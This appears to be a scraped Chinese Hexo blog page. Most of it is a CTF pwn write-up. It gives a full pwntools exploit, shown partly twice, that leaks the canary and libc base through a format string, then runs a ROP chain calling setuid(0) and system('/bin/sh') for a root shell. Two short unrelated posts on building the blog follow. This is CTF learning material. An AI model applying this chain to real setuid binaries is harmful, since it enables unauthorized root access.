class="line">pop_rdx_pop_r12_ret_libc=<span class="number">0x11f2e7</span></span><br><span class="line"><span class="comment">#在库中找到的pop指令，便于payload的使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_libc=libc_start_main-libc_start_main_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc&#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line"><span class="built_in">open</span> = open_libc+base_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open: &#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">open</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=pop_rdi_ret_libc+base_libc</span><br><span class="line">pop_rsi_ret=pop_rsi_ret_libc+base_libc</span><br><span class="line">pop_rbp_ret=pop_rbp_ret_libc+base_libc</span><br><span class="line">pop_rdx_pop_r12_ret=pop_rdx_pop_r12_ret_libc+base_libc</span><br><span class="line"><span class="comment">#确定真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%8$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">zhan=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;zhen: &#x27;</span>,<span class="built_in">hex</span>(zhan))</span><br><span class="line">flag=zhan-<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span>,<span class="built_in">hex</span>(flag))</span><br><span class="line"><span class="comment">#为了暴露程序指令的真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cx_libc=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cx_libc: &#x27;</span>,<span class="built_in">hex</span>(cx_libc))</span><br><span class="line"></span><br><span class="line">cx_base=cx_libc-<span class="number">0x1b25</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cx_base: &#x27;</span>,<span class="built_in">hex</span>(cx_base))</span><br><span class="line"><span class="comment">#暴露栈地址（这个和上面那个其实都可以不要）</span></span><br><span class="line"></span><br><span class="line">syscall = base_libc + <span class="number">0x0000000000091316</span></span><br><span class="line">pop_rax = base_libc + <span class="number">0x0000000000045eb0</span></span><br><span class="line"></span><br><span class="line">read_cx=<span class="number">0x1150</span></span><br><span class="line">puts_cx=<span class="number">0x1110</span></span><br><span class="line">bss_cx=<span class="number">0x5070</span></span><br><span class="line">leave_cx=<span class="number">0x19E8</span></span><br><span class="line">main_cx=<span class="number">0x1984</span></span><br><span class="line">main=main_cx+cx_base</span><br><span class="line">leave=leave_cx+cx_base</span><br><span class="line"></span><br><span class="line">exe = base_libc + <span class="number">0xebc8</span></span><br><span class="line">puts = cx_base + <span class="number">0x4FB0</span></span><br><span class="line"><span class="built_in">str</span> = base_libc + <span class="built_in">next</span>(elo.search(<span class="built_in">bytes</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">sys_ = base_libc + elo.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret = base_libc + <span class="number">0x29139</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leqave: &#x27;</span>,<span class="built_in">hex</span>(leave))</span><br><span class="line">read_plt=read_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_plt: &#x27;</span>,<span class="built_in">hex</span>(read_plt))</span><br><span class="line">puts_plt=puts_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_plt: &#x27;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line">bss=bss_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bss: &#x27;</span>,<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]</span><br><span class="line">setuid=setuid_libc+base_libc</span><br><span class="line"><span class="comment">#cat os.setuid(0)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#栈溢出的基本准备，从输入到canary的长度的垃圾数据+canary的值+覆盖ebp的8字节垃圾数据</span></span><br><span class="line"></span><br><span class="line">payload += flat(ret,pop_rdi_ret, <span class="built_in">str</span>, ret,sys_)</span><br><span class="line"><span class="comment">#以此在栈溢出后执行system（/bin/sh）然后获得shell</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用如上的脚本然后攻击便可以拿到服务器的shell但是当你直接运行这个拿到shell准备开始读取flag文件是会发现权限不足，并且在其中将chmod等加权的命令禁止，这里便是我看来这道提最为难受的地方，以及拿到shell但由于flag文件的读取需要root权限导致到嘴的鸭子没了，就眼睁睁看着flag文件就在面前却读取不了，当时在比赛中这题我到这里是已经是最后10分钟了，由于我在之前并没有接触过这个东西，因此及时到结束都依然存在flag读不出来这个问题。</p>
<img src="/2024/03/28/hxctf/image-20240328205758246.png" alt="image-20240328205758246" style="zoom:67%;">





<p>后来在学长的指导下才知道这个知识点，也算是收货了一波新知识。</p>
<p>关于这个知识先来看一个点，在拿到shell后由于ls类命令还是可以使用的边可以看看个个文件的权限。用<code>ls -l</code>d的指令</p>
<p><img src="/2024/03/28/hxctf/image-20240325200803566.png" alt="image-20240325200803566"></p>
<p>在这里边更可以看出此时的flag文件只有一个root用户的rw权限，而此时我们的权限只是一个低用户的权限，故我们并不能之前读取这个文件，同时这个里面还将chmod等加权命令禁止了，故必须想其他的办法，我们便从新看看这个各各文件的权限，会发现在pwn这个文件中有一个其他文件都没有的权限s，而pwn正是我们所攻击的文件，或许这个pwn文件的s权限说不定便是一个比较特殊的突破口。</p>
<p>首先来小小的介绍这个s权限是什么（大量源于网上内容，可能不真）</p>
<p>s权限： 设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份. 典型的文件是passwd. 如果一般用户执行该文件, 则在执行过程中, 该文件可以获得root权限, 从而可以更改用户的密码.</p>
<p>  举个简单的例子，某个可执行文件foo，如果起所有者为root，在其权限为普通的x的时候，该文件被执行的时候，是以执行该文件的用户权限在执行。但是将其设置为s的时候，该文件被执行就是以root权限来执行了。</p>
<p>s权限的作用：表示对文件具用可执行权限的用户将使用文件拥有者的权限或文件拥有者所在组的权限在对文件进行执行</p>
<p>简单来说就是当一个文件拥有s权限后便可以在通过一下特殊的执行后可以获得root的用户权限</p>
<p>诶，这一听是不是刚刚好，只要我们能通过这个特殊的调用然后执行这个文件不就刚刚好有root权限级的shell从而能读取flag的内容，可是问题在于这个特殊的调用是什么？</p>
<p>正是<strong>setuid 位</strong></p>
<p>当使用 setuid （设置用户 ID）位时，之前描述的行为会有所变化，所以当一个可执行文件启动时，它不会以启动它的用户的权限运行，而是<strong>以该文件所有者的权限运行</strong>。所以，如果在一个可执行文件上设置了 setuid 位，并且该文件由 root 拥有，当一个普通用户启动它时，它将以 root 权限运行。显然，如果 setuid 位使用不当的话，会带来潜在的安全风险。</p>
<p>使用 setuid 权限的可执行文件的例子是 <code>passwd</code>，我们可以使用该程序更改登录密码。我们可以通过使用 <code>ls</code> 命令来验证：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /bin/passwd</span><br><span class="line">-rwsr-xr-x. 1 root root 27768 Feb 11 2017 /bin/passwd</span><br></pre></td></tr></table></figure>



<p>简单来说就是，就是使用setuid函数，准确来说便是在栈溢出后执行setuid（0），然后再执行system（&#x2F;bin&#x2F;sh）</p>
<p>便可以拿到有root级的shell，而这个setuid函数可以直接在libc库中寻找</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elo=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]    </span><br><span class="line">setuid=setuid_libc+base_libc</span><br><span class="line">payload=flat(pop_rdi_ret,<span class="number">0</span>,stuid,用于拿到shell的过程)   </span><br></pre></td></tr></table></figure>



<p>因此这道题的完整版exp为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node.nkctf.yuzhian.com.cn&quot;, 38793 )</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span> ,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b $rebase(0x19e8)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#在这题中由于开启了PIE保护，故要下断点必须加上$rebase()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;111.0 SSS+&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#以上是进入漏洞函数</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary =<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary: &#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#将canary的值暴露出来，方便栈溢出</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#为了回到main函数中，随便读入数据进去</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%33$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main_128=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_start_main_128: &#x27;</span>,<span class="built_in">hex</span>(libc_start_main_128))</span><br><span class="line">libc_start_main=libc_start_main_128-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_start_main: &#x27;</span>,<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"><span class="comment">#将libc_base的值暴露出来，先随便暴露一个函数的got表地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elo=ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">elo=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc_start_main_libc=elo.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__libc_start_main_libc&#x27;</span>,<span class="built_in">hex</span>(libc_start_main_libc))</span><br><span class="line">open_libc=elo.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open_libc&#x27;</span>,<span class="built_in">hex</span>(open_libc))</span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过链接libc库从而找到暴露的函数的偏移量，以及需要的函数的偏移量</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret_libc=<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi_ret_libc=<span class="number">0x2be51</span></span><br><span class="line">pop_rbp_ret_libc=<span class="number">0x2a2e0</span></span><br><span class="line">pop_rdx_pop_r12_ret_libc=<span class="number">0x11f2e7</span></span><br><span class="line"><span class="comment">#在库中找到的pop指令，便于payload的使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_libc=libc_start_main-libc_start_main_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc&#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line"><span class="built_in">open</span> = open_libc+base_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open: &#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">open</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=pop_rdi_ret_libc+base_libc</span><br><span class="line">pop_rsi_ret=pop_rsi_ret_libc+base_libc</span><br><span class="line">pop_rbp_ret=pop_rbp_ret_libc+base_libc</span><br><span class="line">pop_rdx_pop_r12_ret=pop_rdx_pop_r12_ret_libc+base_libc</span><br><span class="line"><span class="comment">#确定真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%8$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">zhan=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;zhen: &#x27;</span>,<span class="built_in">hex</span>(zhan))</span><br><span class="line">flag=zhan-<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span>,<span class="built_in">hex</span>(flag))</span><br><span class="line"><span class="comment">#为了暴露程序指令的真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cx_libc=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cx_libc: &#x27;</span>,<span class="built_in">hex</span>(cx_libc))</span><br><span class="line"></span><br><span class="line">cx_base=cx_libc-<span class="number">0x1b25</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cx_base: &#x27;</span>,<span class="built_in">hex</span>(cx_base))</span><br><span class="line"><span class="comment">#暴露栈地址（这个和上面那个其实都可以不要）</span></span><br><span class="line"></span><br><span class="line">syscall = base_libc + <span class="number">0x0000000000091316</span></span><br><span class="line">pop_rax = base_libc + <span class="number">0x0000000000045eb0</span></span><br><span class="line"></span><br><span class="line">read_cx=<span class="number">0x1150</span></span><br><span class="line">puts_cx=<span class="number">0x1110</span></span><br><span class="line">bss_cx=<span class="number">0x5070</span></span><br><span class="line">leave_cx=<span class="number">0x19E8</span></span><br><span class="line">main_cx=<span class="number">0x1984</span></span><br><span class="line">main=main_cx+cx_base</span><br><span class="line">leave=leave_cx+cx_base</span><br><span class="line"></span><br><span class="line">exe = base_libc + <span class="number">0xebc8</span></span><br><span class="line">puts = cx_base + <span class="number">0x4FB0</span></span><br><span class="line"><span class="built_in">str</span> = base_libc + <span class="built_in">next</span>(elo.search(<span class="built_in">bytes</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">sys_ = base_libc + elo.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret = base_libc + <span class="number">0x29139</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leqave: &#x27;</span>,<span class="built_in">hex</span>(leave))</span><br><span class="line">read_plt=read_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_plt: &#x27;</span>,<span class="built_in">hex</span>(read_plt))</span><br><span class="line">puts_plt=puts_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_plt: &#x27;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line">bss=bss_cx+cx_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bss: &#x27;</span>,<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]</span><br><span class="line">setuid=setuid_libc+base_libc</span><br><span class="line"><span class="comment">#cat os.setuid(0)</span></span><br><span class="line"><span class="comment">#获得setuid函数的地址</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#栈溢出的基本准备，从输入到canary的长度的垃圾数据+canary的值+覆盖ebp的8字节垃圾数据</span></span><br><span class="line"></span><br><span class="line">payload += flat(ret,pop_rdi_ret,<span class="number">0</span>,setuid,pop_rdi_ret, <span class="built_in">str</span>, ret,sys_)</span><br><span class="line"><span class="comment">#以此在栈溢出后先执行setuid(0)，然后在执行system（/bin/sh）然后获得root级shell，便可以直接用cat flag将flag读出来</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>终于写完关于这道题的wp，虽然有的地方比较省，不过那些都是一些比较基本的东西，应该都能看懂的吧。</p>
<p>做了一天，wp一天，所幸还是有所收获，这就好，前途漫漫亦灿灿。</p>
<p><img src="/2024/03/28/hxctf/image-20240328214024472.png" alt="image-20240328214024472"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn%E9%A2%98%E8%A7%A3/" rel="tag">pwn题解</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-博客之痛" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/" class="article-date">
  	<time datetime="2024-03-27T13:27:07.000Z" itemprop="datePublished">2024-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/">
        博客之痛
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>历时三天终于把这个破博客给搭出来了</p>
<p>地址：<a href="https://2023478.github.io/">纲的blog (2023478.github.io)</a></p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327213022031-17115462250291.png" alt="image-20240327213022031"><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327213044821.png" alt="image-20240327213044821"></p>
<p>已算是把之前最开始进实验室叫搭博客，用了其他人的服务器直接整了一个从而混过去的债给还上了</p>
<p>不过这博客搭起来是真的麻烦，前前后后花了3天的晚上才整好（白天上课加玩去了）</p>
<p>这次整的博客用的主体是hexo+github整的一个静态博客，不得不说这个静态博客确实不如之前找同学整的那个动态的好，发文章也麻烦，问题还一大推，是真的烦。所幸最终还是把大概的给整出来了，也还算可以。</p>
<p>就用这遍文章将遇到大概写一下吧，当然主要还是将那些大佬的文章记录一下。</p>
<p><em>2.关于图片没有办法显示的</em></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/265077468">hexo博客如何插入图片 - 知乎 (zhihu.com)</a></p>
<p>这个是大佬，我用这个办法一下就成</p>
<p><em>3.关于换主题的</em></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/385525053">hexo博客换主题 - 知乎 (zhihu.com)</a></p>
<p>这个也是一遍好文，我当时想直接通过，命令下，不过不成，就直接下压缩包，解压le</p>
<p><em>4.关于搭博客的基本</em></p>
<p>这个有很多了就不多写，放几篇好一点的</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1520557">这可能是迄今为止最全的hexo博客搭建教程-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎 (zhihu.com)</a></p>
<p><em>5.关于第一次无法上传到github</em></p>
<p>这个真的是个大麻烦，当时怎么整都没有传上去，最后在有篇文章的评论里找到（真的离谱）</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎 (zhihu.com)</a></p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327220751938.png" alt="image-20240327220751938"></p>
<p>好了这篇文章到这里差不多就结束了，如果以后再遇到问题，就在更这篇文章，</p>
<p>不过我的博客好像有点简陋，ε&#x3D;(´ο｀*)))唉，先不管，等以后有时间再慢慢整，</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327221055613.png" alt="image-20240327221055613">痛，太痛了</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327221127889.png" alt="image-20240327221127889"></p>
<p>好家伙，刚刚准备将这篇文章上传，然后准备润，就给我来了个大的，痛，痛，痛</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327221350554.png" alt="image-20240327221350554"></p>
<p>行吧，在将这个问题解决一下，像这种一看就是在文章的开头写基本信息那出问题了，一般不是空格，就是英文符号整成中文的了，改吧，真的麻烦。所以关于这些空格和英文符号得好好整。啊！啊！第二次才改好。痛，痛，痛。</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327221849389.png" alt="image-20240327221849389"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%90%AD%E5%8D%9A%E5%AE%A2/" rel="tag">搭博客</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/%E5%8D%9A%E5%AE%A2/">博客</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-hexo" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/27/hexo/" class="article-date">
  	<time datetime="2024-03-27T13:14:28.000Z" itemprop="datePublished">2024-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/27/hexo/">
        hexo基操
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="常用指令和发布文章"><a href="#常用指令和发布文章" class="headerlink" title="常用指令和发布文章"></a><strong>常用指令和发布文章</strong></h3><ul>
<li>常用指令</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="string">&quot;postName&quot;</span>        <span class="comment">//新建文章</span></span><br><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;pageName&quot;</span>        <span class="comment">//新建页面</span></span><br><span class="line">hexo g          <span class="comment">//生成静态页面至public目录</span></span><br><span class="line">hexo server         <span class="comment">//开启预览访问端口（默认端口4000，&#x27;ctrl + c&#x27;关闭server）</span></span><br><span class="line">hexo deploy         <span class="comment">//将.deploy目录部署到GitHub</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>常用组合</li>
</ul>
